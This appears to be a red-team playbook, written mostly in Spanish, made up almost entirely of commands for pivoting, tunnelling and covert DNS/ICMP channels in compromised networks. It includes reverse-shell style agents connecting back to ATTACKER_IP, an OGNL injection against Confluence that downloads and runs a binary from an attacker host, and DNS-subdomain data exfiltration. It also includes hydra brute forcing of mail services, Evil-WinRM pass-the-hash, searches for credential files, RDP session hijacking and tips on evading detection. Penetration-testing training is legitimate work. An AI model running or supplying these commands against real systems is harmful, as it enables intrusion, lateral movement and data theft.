# 🔀 Red Team Pivoting, Port Forwarding & Tunneling Playbook

<p align="center">
  <a href="https://araizcorp.tech"><img src="https://img.shields.io/badge/Official_Website-araizcorp.tech-1f425f?style=for-the-badge&logo=firefox" /></a>
  <a href="https://academy.araizcorp.tech"><img src="https://img.shields.io/badge/Academy_Platform-academy.araizcorp.tech-red?style=for-the-badge&logo=target" /></a>
  <img src="https://img.shields.io/badge/Commands-574+-brightgreen?style=for-the-badge" />
</p>

---

A production-ready reference playbook for **Network Pivoting, SOCKS5 Proxies, Reverse Port Forwarding, and Covert Channels** in enterprise environments, authored by [AraizCorp](https://araizcorp.tech).

Covers end-to-end tooling and techniques: **Ligolo-ng, Chisel, SSH Tunneling & Jump Hosts, Socat, Web Tunnels (reGeorg/Neo-reGeorg), Covert DNS/ICMP Channels, and Proxychains routing**.

---

## 📑 Table of Contents

- [01 — Ligolo-ng: TUN Interface, Agents, Routing & Double Pivoting](#01-ligolo-ng-tun-interface-agents-routing-double-pivoting) (34 commands)
- [02 — Chisel: Reverse SOCKS5, Port Forwarding & Egress-Restricted Networks](#02-chisel-reverse-socks5-port-forwarding-egress-restricted-networks) (16 commands)
- [03 — SSH Tunneling: Local, Remote, Dynamic SOCKS5 & Jump Hosts](#03-ssh-tunneling-local-remote-dynamic-socks5-jump-hosts) (23 commands)
- [04 — Socat, Netsh & Native Port Forwarding / Relays](#04-socat-netsh-native-port-forwarding-relays) (10 commands)
- [05 — Web-Based Tunneling (reGeorg, Neo-reGeorg, Cloudflared, Ngrok)](#05-web-based-tunneling-regeorg-neo-regeorg-cloudflared-ngrok) (10 commands)
- [06 — Covert Channels over DNS & ICMP (dnscat2, iodine, ptunnel)](#06-covert-channels-over-dns-icmp-dnscat2-iodine-ptunnel) (18 commands)
- [07 — Proxychains, Tool Routing & Network Pivoting Execution](#07-proxychains-tool-routing-network-pivoting-execution) (463 commands)
- [🎓 Advanced Hands-On Training](#-advanced-hands-on-training)

---

## 01 — Ligolo-ng: TUN Interface, Agents, Routing & Double Pivoting

#### Prepara la interfaz TUN del lado atacante para enrutar trafico por Ligolo.
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo0 && sudo ip link set ligolo0 up
```

#### Arranca el proxy Ligolo con certificado autofirmado.
```bash
./proxy -selfcert
```

#### Conecta el agente Windows al proxy del atacante.
```bash
.\ligolo-agent.exe -connect ATTACKER_IP:11601 -accept-fingerprint FINGERPRINT
```

#### Lista sesiones disponibles dentro de la consola de Ligolo.
```bash
ligolo-ng » session
```

#### Selecciona la sesion que usara el tunel.
```bash
ligolo-ng » session select 1
```

#### Levanta el tunel para empezar a enrutar trafico.
```bash
tunnel_start --tun ligolo0
```

#### Agrega una ruta hacia una red interna a traves de Ligolo.
```bash
interface_add_route --name ligolo0 --route 192.168.10.0/24
```

#### Publica un listener para redirigir trafico a un servicio local o interno.
```bash
listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443 --tcp
```

#### Crear interfaz TUN manualmente (proxy)
```bash
sudo ip addr add 10.10.10.1/24 dev ligolo0
```

#### ARRANCAR EL PROXY (KALI / C2) / Comprobar escucha: Lista procesos en ejecución.
```bash
ps aux | grep ligolo-proxy
```

#### FLUJO TÍPICO DE USO / 5️⃣ Crear listener
```bash
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```

#### PROBAR LOCALMENTE CON AGENT LINUX
```bash
/usr/bin/ligolo-agent -connect 10.0.0.5:11601
```

#### PROBAR LOCALMENTE CON AGENT LINUX
```bash
/usr/bin/ligolo-agent -connect 10.0.0.5:11601 -accept-fingerprint <FP>
```

#### Crea la interfaz TUN 'ligolo' en el atacante. Solo hace falta hacerlo una vez por sesión. Requiere root.
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
```

#### Activa la interfaz TUN ligolo. Necesario antes de iniciar el proxy.
```bash
sudo ip link set ligolo up
```

#### Igual que el anterior pero en puerto 443 (HTTPS) para evadir firewalls que filtran puertos no estándar.
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

#### Ejecuta el agente Linux en el objetivo. Se conecta de vuelta al proxy del atacante. -ignore-cert acepta el cert autofirmado.
```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

#### Agente Windows. Conecta al proxy del atacante. Se puede renombrar antes de subir al objetivo para evadir detección por nombre.
```bash
.\agent.exe -connect ATTACKER_IP:11601 -ignore-cert
```

#### Lanza el agente en background para no bloquear la terminal del objetivo.
```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert &
```

#### Dentro de la consola ligolo: lista las sesiones de agentes conectados y permite seleccionar una.
```bash
session
```

#### Dentro de la consola ligolo: inicia el túnel con el agente seleccionado. A partir de aquí el tráfico fluye sin proxychains.
```bash
start
```

#### Dentro de la consola ligolo: detiene el túnel activo.
```bash
stop
```

#### Port-forward en el agente: redirige conexiones al puerto 1234 del objetivo hacia el puerto 4444 del atacante. Útil para descargar archivos o recibir shells.
```bash
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
```

#### Crea un listener SOCKS5 en el agente. Útil cuando una herramienta no soporta enrutamiento directo y necesita proxychains.
```bash
listener_add --addr 0.0.0.0:1080 --to 127.0.0.1:1080 --tcp
```

#### Lista todos los listeners activos en el agente seleccionado.
```bash
listener_list
```

#### Para un listener específico por su ID.
```bash
listener_stop --id 0
```

#### Enruta la subnet interna del objetivo por la interfaz ligolo. Después de esto puedes alcanzar 192.168.1.x directamente sin proxychains.
```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```

#### Ejemplo con subnet 10.x. Adaptar a la subnet que mostró ifconfig en la consola ligolo.
```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

#### Elimina la ruta una vez terminado el engagement. Limpieza.
```bash
ip route del 192.168.1.0/24 dev ligolo
```

#### Crea una segunda interfaz TUN para el segundo salto de pivoting.
```bash
sudo ip tuntap add user kali mode tun ligolo2 && sudo ip link set ligolo2 up
```

#### En la consola del primer agente: relay para que el segundo agente (en red 2) pueda conectar al segundo proxy del atacante.
```bash
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
```

#### Segundo agente (en red 2/3) conecta al primer pivote en el puerto relay 11602, que llega al segundo proxy del atacante.
```bash
./agent -connect 20.20.20.1:11602 -ignore-cert
```

#### Enruta la tercera red interna por ligolo2. Ya se puede llegar a 30.30.30.x directamente.
```bash
sudo ip route add 30.30.30.0/24 dev ligolo2
```

#### Version Windows de un SOCKS reverso con Chisel.
```bash
.\chisel.exe client ATTACKER_IP:8001 R:1080:socks
```

---

## 02 — Chisel: Reverse SOCKS5, Port Forwarding & Egress-Restricted Networks

#### Inicia servidor Chisel con soporte para reverse tunnels.
```bash
chisel server --reverse -p 8001
```

#### Expone un SOCKS reverse desde el pivote hacia el atacante.
```bash
chisel client ATTACKER_IP:8001 R:socks
```

#### Crea un SOCKS reverse en un puerto especifico del lado atacante.
```bash
chisel client ATTACKER_IP:8001 R:1080:socks
```

#### Redirige RDP del pivote hacia el atacante.
```bash
chisel client ATTACKER_IP:8001 R:3389:127.0.0.1:3389
```

#### Ejemplo de uso de Chisel SOCKS con herramientas externas.
```bash
proxychains -q nmap -Pn -sT 192.168.10.25 -p 445,3389
```

#### Servidor Chisel en el atacante. Puerto 443 para parecer HTTPS. --reverse permite que el cliente abra el SOCKS desde su lado.
```bash
chisel server -p 443 --reverse --socks5
```

#### Cliente (objetivo): conecta al servidor y abre un proxy SOCKS5 en el puerto 1080 del atacante. Usar con proxychains.
```bash
chisel client ATTACKER_IP:443 R:socks
```

#### Igual con autenticación para evitar que terceros usen el túnel.
```bash
chisel client --auth user:pass ATTACKER_IP:443 R:socks
```

#### Port-forward específico: expone el RDP de una máquina interna en el puerto 3389 del atacante.
```bash
chisel client ATTACKER_IP:8080 R:3389:INTERNAL_RDP:3389
```

#### Cliente Chisel que establece un proxy SOCKS5 reverso a traves del puerto 443. El trafico se encapsula en HTTP/WebSocket, evadiendo firewalls restrictivos.
```bash
chisel client <ATACANTE_IP>:443 R:socks
```

#### Servidor Chisel con autenticacion para evitar que terceros usen el tunel. --auth requiere credenciales que el cliente debe proporcionar con --auth.
```bash
chisel server -p 8080 --auth user:password --reverse
```

#### Cliente con autenticacion que crea un proxy SOCKS reverso en el puerto 1080 del servidor. El trafico parece HTTP normal para los dispositivos de red.
```bash
chisel client --auth user:password <ATACANTE_IP>:8080 R:1080:socks
```

#### Usa OGNL Injection para descargar y preparar el binario de Chisel en CONFLUENCE01.
```bash
curl http://<target>:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','wget http://<kali_ip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel').start()")}
```

#### Ejecuta el cliente Chisel creando un proxy SOCKS inverso desde CONFLUENCE01 a Kali.
```bash
/tmp/chisel client <kali_ip>:8080 R:socks > /dev/null 2>&1 &
```

#### Usa el túnel SOCKS creado por Chisel para acceder a sistemas internos vía SSH.
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.4.50.215
```

#### Inicia el servidor Chisel en Kali para permitir túneles inversos encapsulados en HTTP.
```bash
chisel server --port 8080 --reverse
```

---

## 03 — SSH Tunneling: Local, Remote, Dynamic SOCKS5 & Jump Hosts

#### Forward local para acceder a un servicio interno del pivote.
```bash
ssh -L 8080:127.0.0.1:80 user@pivot
```

#### Forward remoto para que el pivote exponga un servicio del atacante.
```bash
ssh -R 9001:127.0.0.1:4444 user@pivot
```

#### Levanta un SOCKS local para pivotar varias herramientas.
```bash
ssh -D 1080 user@pivot
```

#### Salta a un host interno usando ProxyJump.
```bash
ssh -J user1@jump user2@internal
```

#### Version util en laboratorio cuando no quieres friccion por host keys.
```bash
ssh -o StrictHostKeyChecking=no -D 1080 user@pivot
```

#### Creación de Usuario Restringido para Túneles SSH
```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
```

#### Secuestrar Sesión RDP (tscon)
```bash
tscon 3 /dest:rdp-tcp#6
```

#### Crear túnel RDP usando socat en el pivote
```bash
C:\tools\socat\socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

#### Túnel SSH para explotar Rejetto HFS en THMDC
```bash
-R 8888:thmdc.za.tryhackme.com:80
```

#### Túnel SSH para explotar Rejetto HFS en THMDC
```bash
-L *:6666:127.0.0.1:6666
```

#### Túnel SSH para explotar Rejetto HFS en THMDC
```bash
-L *:7878:127.0.0.1:7878 -N
```

#### Opciones útiles: Abre una conexión SSH.
```bash
ssh -A user@host
```

#### Usar Proxychains
```bash
proxychains nmap -sT -Pn 10.10.10.0/24
```

#### Usar Proxychains
```bash
proxychains curl http://10.10.10.15
```

#### Hashcat: Crackea hashes offline con reglas o diccionarios.
```bash
hashcat -a 0 -m 0 hash diccionario.txt
```

#### Hashcat: Crackea hashes offline con reglas o diccionarios.
```bash
hashcat -a 3 -m 0 hash ?d?d?d?d
```

#### SOCKS a traves de varios jump hosts usando ProxyJump.
```bash
ssh -o StrictHostKeyChecking=no -N -D 1080 -J user1@jump1,user2@jump2 user@dest
```

#### Crea un tunel TUN sobre SSH cuando el servidor permite PermitTunnel.
```bash
ssh -w 0:0 root@pivot -o Tunnel=point-to-point
```

#### Encapsula SSH a traves de un proxy HTTPS para evadir salidas muy restringidas.
```bash
ssh -N -L 443:internal.corp:443 -o ProxyCommand='openssl s_client -connect proxy.corp:443 -quiet' user@pivot
```

#### Proxy SOCKS a traves de multiples saltos SSH (jump hosts). -J encadena proxies SSH para alcanzar redes profundamente segmentadas. Cada salto requiere credenciales.
```bash
ssh -o StrictHostKeyChecking=no -N -D 1080 -J user1@jump1:22,user2@jump2:22 user@destino
```

#### Tunel SSH a traves de un proxy HTTPS corporativo usando openssl como ProxyCommand. Encapsula SSH dentro de una conexion TLS para evadir firewalls.
```bash
ssh -N -L 443:internal.corp:443 -o ProxyCommand='openssl s_client -connect proxy.corp:443 -quiet' user@pivote
```

#### Proxy SOCKS con keepalive configurado. ServerAliveInterval envia paquetes cada 60 segundos para mantener el tunel activo y detectar desconexiones.
```bash
ssh -N -D 1080 -o 'ServerAliveInterval 60' -o 'ServerAliveCountMax 3' user@<PIVOTE_IP>
```

#### Crea un tunel VPN Layer 3 (TUN) sobre SSH. -w 0:0 asigna interfaces tun0 en ambos lados. Requiere PermitTunnel yes en sshd_config. Mas potente que SOCKS proxy.
```bash
ssh -w 0:0 root@<PIVOTE_IP> -o Tunnel=point-to-point
```

---

## 04 — Socat, Netsh & Native Port Forwarding / Relays

#### Crea un port forward nativo en Windows hacia un host interno.
```bash
netsh interface portproxy add v4tov4 listenport=8445 listenaddress=0.0.0.0 connectport=445 connectaddress=192.168.10.15
```

#### Abre el puerto del portproxy en el firewall de Windows.
```bash
netsh advfirewall firewall add rule name='8445' dir=in action=allow protocol=TCP localport=8445
```

#### Establece un reverse tunnel desde Windows con Plink.
```bash
plink.exe -R 8443:127.0.0.1:8443 user@ATTACKER_IP -pw Password123!
```

#### Crea un contexto de red util para alcanzar recursos internos con otras credenciales.
```bash
runas /netonly /user:CORP\user cmd.exe
```

#### Abre un puerto concreto para reverse shell o tunel en Windows.
```bash
New-NetFirewallRule -DisplayName 'Pivot-4444' -Direction Inbound -Protocol TCP -LocalPort 4444 -Action Allow
```

#### Port forward simple con Socat hacia un host interno.
```bash
socat TCP-LISTEN:9001,fork TCP:192.168.10.20:3389
```

#### Expone localmente un servicio web del pivote.
```bash
socat TCP-LISTEN:8081,fork TCP:127.0.0.1:80
```

#### Forward local desde Meterpreter hacia un servicio interno.
```bash
meterpreter > portfwd add -l 8443 -p 443 -r 192.168.10.15
```

#### Anade una ruta interna para trabajar con modulos Metasploit.
```bash
meterpreter > autoroute -s 192.168.10.0/24
```

#### Modulo de Metasploit para crear un SOCKS y combinarlo con autoroute.
```bash
auxiliary/server/socks_proxy
```

---

## 05 — Web-Based Tunneling (reGeorg, Neo-reGeorg, Cloudflared, Ngrok)

#### Genera el webshell de Neo-reGeorg para pivotar a traves de un servidor web.
```bash
python3 neoreg.py generate -k PASSWORD --file neoreg.php
```

#### Conecta al webshell y crea un SOCKS5 local.
```bash
python3 neoreg.py -k PASSWORD -u http://TARGET/neoreg.php -p 1080
```

#### Expone un servicio HTTP local con URL publica HTTPS.
```bash
cloudflared tunnel --url http://localhost:8080
```

#### Expone un servicio TCP local a traves de Cloudflare.
```bash
cloudflared tunnel --url tcp://localhost:22
```

#### Expone un servidor web local con autenticacion basica.
```bash
ngrok http 80 --basic-auth 'user:password'
```

#### Publica un servicio TCP con logging para monitorizar callbacks.
```bash
ngrok tcp 443 --log=stdout --log-level=info
```

#### Crea un tunel persistente con nombre y configura DNS para que apunte al tunel. Proporciona acceso estable a traves de un subdominio personalizado.
```bash
cloudflared tunnel create mi-tunel && cloudflared tunnel route dns mi-tunel tunel.midominio.com
```

#### Genera el webshell de Neo-reGeorg ofuscado con password. Soporta PHP, ASPX, JSP, ASHX. El webshell se sube al servidor web comprometido para crear el tunel.
```bash
python3 neoreg.py generate -k <password> --file neoreg.php
```

#### Conecta al webshell de Neo-reGeorg y crea un proxy SOCKS5 local en el puerto 1080. Permite pivotar a la red interna a traves del servidor web comprometido.
```bash
python3 neoreg.py -k <password> -u http://<OBJETIVO>/neoreg.php -p 1080
```

#### Version clasica de reGeorg: crea un proxy SOCKS a traves de un webshell ASPX. El trafico HTTP normal enmascara el tunelamiento. Usar con proxychains.
```bash
python3 reGeorgSocksProxy.py -u http://<OBJETIVO>/tunnel.aspx -p 1080
```

---

## 06 — Covert Channels over DNS & ICMP (dnscat2, iodine, ptunnel)

#### Servidor de tunel DNS con iodine.
```bash
iodined -f -c -P PASSWORD 10.0.0.1 tunnel.domain.tld
```

#### Cliente iodine que encapsula trafico IP en consultas DNS.
```bash
iodine -f -P PASSWORD DNS_SERVER tunnel.domain.tld
```

#### Servidor DNScat2 para C2 o tunel interactivo sobre DNS.
```bash
dnscat2-server tunnel.domain.tld
```

#### Cliente DNScat2 sobre TXT records.
```bash
dnscat --dns 'domain=tunnel.domain.tld,type=TXT'
```

#### Servidor de tunel TCP sobre ICMP con ptunnel-ng.
```bash
ptunnel-ng -s
```

#### Forward HTTP a traves de paquetes ICMP.
```bash
ptunnel-ng -p PIVOT_IP -l 8080 -r TARGET_IP -R 80
```

#### Servidor de tunel DNS con iodine. -f foreground, -c desactiva compresion, -P password. Crea una interfaz tun con IP 10.0.0.1. Requiere un dominio con registros NS.
```bash
iodined -f -c -P <password> 10.0.0.1 tunnel.dominio.com
```

#### Cliente iodine que establece el tunel DNS. Encapsula trafico IP dentro de consultas DNS (TXT, CNAME, MX). Evade firewalls que permiten DNS (puerto 53).
```bash
iodine -f -P <password> <DNS_SERVER> tunnel.dominio.com
```

#### Servidor DNScat2 para tunelizar datos sobre DNS. Proporciona un shell interactivo y transferencia de archivos a traves de consultas DNS. Muy sigiloso.
```bash
dnscat2-server tunnel.dominio.com
```

#### Cliente DNScat2 que establece un canal de comando y control sobre DNS. Usa registros TXT para mayor capacidad de datos. Dificil de detectar por DLP basicos.
```bash
dnscat --dns 'domain=tunnel.dominio.com,type=TXT'
```

#### Cliente ptunnel-ng: redirige el puerto 8080 local al puerto 80 del destino a traves de paquetes ICMP via el pivote. Evade firewalls que permiten ICMP.
```bash
ptunnel-ng -p <PIVOTE_IP> -l 8080 -r <DESTINO_IP> -R 80
```

#### Servidor HANS que crea una VPN sobre ICMP. Asigna IPs virtuales (10.0.0.x) a los clientes. Mas estable que ptunnel para conexiones de larga duracion.
```bash
hans -s 10.0.0.1 -p <password>
```

#### Cliente HANS que conecta al servidor VPN-ICMP. Crea una interfaz tun con IP virtual. Todo el trafico a traves de la interfaz viaja encapsulado en paquetes ICMP.
```bash
hans -c <SERVIDOR_IP> -p <password>
```

#### Configura dnsmasq como servidor DNS autoritativo para la zona 'feline.corp'.
```bash
sudo dnsmasq -C dnsmasq.conf -d
```

#### Ejecuta el cliente dnscat2 desde una máquina comprometida que puede resolver 'feline.corp'.
```bash
./dnscat feline.corp
```

#### Consulta un registro TXT personalizado para infiltrar datos en la red.
```bash
nslookup -type=txt www.feline.corp
```

#### Consulta DNS para exfiltrar datos codificados como subdominios hacia el servidor autoritativo.
```bash
nslookup exfiltrated-data.feline.corp
```

#### Inicia el servidor dnscat2 que escuchará conexiones DNS tunelizadas en el puerto 53.
```bash
dnscat2-server feline.corp
```

---

## 07 — Proxychains, Tool Routing & Network Pivoting Execution

#### Comprueba la configuracion activa del SOCKS antes de lanzar herramientas.
```bash
tail -n 5 /etc/proxychains4.conf
```

#### Agrega un proxy SOCKS5 a Proxychains.
```bash
echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
```

#### Enumera SMB a traves del tunel SOCKS.
```bash
proxychains -q crackmapexec smb 192.168.10.0/24 -u user -p pass --shares
```

#### Accede por RDP a traves del proxy cuando el cliente lo soporta.
```bash
proxychains -q xfreerdp /v:192.168.10.20 /u:user /p:pass
```

#### Ejecuta spray o validacion SMB a traves del pivote.
```bash
proxychains -q nxc smb 192.168.10.0/24 -u users.txt -p 'Company123!'
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
nmap -p110,143,993,995,25,587,465 10.10.10.10 -sV -sC
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
nmap --script imap-ntlm-info,pop3-ntlm-info,smtp-ntlm-info 10.10.10.10
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
openssl s_client -connect 10.10.10.10:imaps -quiet
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
openssl s_client -connect 10.10.10.10:143 -starttls imap
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
openssl s_client -connect 10.10.10.10:pop3s -quiet
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
openssl s_client -connect 10.10.10.10:110 -starttls pop3
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
openssl s_client -connect 10.10.10.10:smtps -quiet
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
openssl s_client -connect 10.10.10.10:587 -starttls smtp
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
curl -k 'imaps://10.10.10.10' --user user:pass -v
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
hydra -L users.txt -P passes.txt imap://10.10.10.10 -V
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
hydra -l user -P passes.txt imaps://10.10.10.10 -V
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
hydra -L users.txt -P passes.txt pop3://10.10.10.10 -V
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
hydra -l user -P passes.txt pop3s://10.10.10.10 -V
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
grep -r "auth_debug\|auth_verbose" /etc/dovecot/
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
echo "VRFY root" | nc -nv 10.10.10.10 25
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
echo "EXPN admin" | nc -nv 10.10.10.10 25
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
(echo "MAIL FROM: test@test.com"; echo "RCPT TO: root") | nc -nv 10.10.10.10 25
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
nc -nv 10.10.10.10 143
```

#### 📧 PROTOCOLOS DE CORREO - IMAP, POP3, SMTP
```bash
hydra -L users.txt -P passes.txt -t 4 pop3s://10.10.10.10 -V -f
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
sudo gem install evil-winrm
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
sudo apt update && sudo apt install evil-winrm
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
git clone https://github.com/Hackplayers/evil-winrm.git
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
cd evil-winrm
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
sudo gem install winrm winrm-fs stringio
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'Password123!'
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -S -i 10.10.10.161 -u 'user' -p 'Password123!'
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'Password123!' -P 5986
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'Password123!' -P 47001
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -H 'aad3b435b51404eeaad3b435b51404ee:8593f9...'
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -H ':8593f9...' # Solo hash NT
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i dc.domain.com -r domain.com -u user -K '0123456789ABCDEF0123456789ABCDEF'
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i dc.domain.com -r domain.com -u user -k
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'Password123!' -c /path/creds.txt
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Evil-WinRM shell v3.5
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u user -p 'Pass' -s ./scripts
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u user -p 'Pass' -s /usr/share/powershell-empire/empire/server/data/module_source/
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Invoke-Binary .\SharpHound.exe
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Invoke-Binary .\winpeas.exe
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
hostname
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
net user
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
net localgroup administrators
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
net group "Domain Admins" /domain
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-LocalUser
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-LocalGroupMember Administrators
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-LocalGroupMember "Remote Desktop Users"
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-Service | Where-Object {$_.Status -eq 'Running'}
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-Process
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-ChildItem -Recurse -Force C:\Users -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*pass*" -or $_.Name -like "*cred*"}
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Get-ChildItem C:\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
Set-ExecutionPolicy Bypass -Scope Process -Force
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u 'user' -p 'Password123!' -v
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
crackmapexec winrm 10.10.10.161 -u user -p password
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 10.10.10.161 -u user -p password # Sin -S
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
nmap -p 5985,5986 10.10.10.161
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i dc.corp.com -r corp.com -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -s ./scripts
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i 192.168.1.100 -u administrator -p 'P@ssw0rd!' -P 5985
```

#### 🔥 EVIL-WINRM - GUÍA COMPLETA
```bash
evil-winrm -i dc01.domain.com -r domain.com -u svc_sql -p 'Password123!' -k
```

#### 🖥️ IPMI – INTELLIGENT PLATFORM MANAGEMENT INTERFACE (COMPLETE GUIDE)
```bash
sudo nmap -sU -p 623 --script ipmi-version <target>
```

#### 🖥️ IPMI – INTELLIGENT PLATFORM MANAGEMENT INTERFACE (COMPLETE GUIDE)
```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

#### 🖥️ IPMI – INTELLIGENT PLATFORM MANAGEMENT INTERFACE (COMPLETE GUIDE)
```bash
use auxiliary/scanner/ipmi/ipmi_version
```

#### 🖥️ IPMI – INTELLIGENT PLATFORM MANAGEMENT INTERFACE (COMPLETE GUIDE)
```bash
set RHOSTS <target>
```

#### 🖥️ IPMI – INTELLIGENT PLATFORM MANAGEMENT INTERFACE (COMPLETE GUIDE)
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

#### 🖥️ IPMI – INTELLIGENT PLATFORM MANAGEMENT INTERFACE (COMPLETE GUIDE)
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo apt update
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo apt install ligolo-ng
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
wget <URL_DEL_ASSET>.tar.gz
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
tar -xzf <archivo>
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
chmod +x proxy ligolo-ng
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo0
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo ip link set ligolo0 up
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo ip addr add 10.10.10.1/24 dev ligolo0 # opcional
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
./proxy -h
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
./proxy -autocert
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo ss -ltnp | grep 11601
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo ufw allow 11601/tcp
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
sudo iptables -I INPUT -p tcp --dport 11601 -j ACCEPT
```

#### 🕸️ LIGOLO-NG – COMPLETE PIVOTING & TUNNELING GUIDE
```bash
.\ligolo-agent.exe -connect <C2_IP>:11601
```

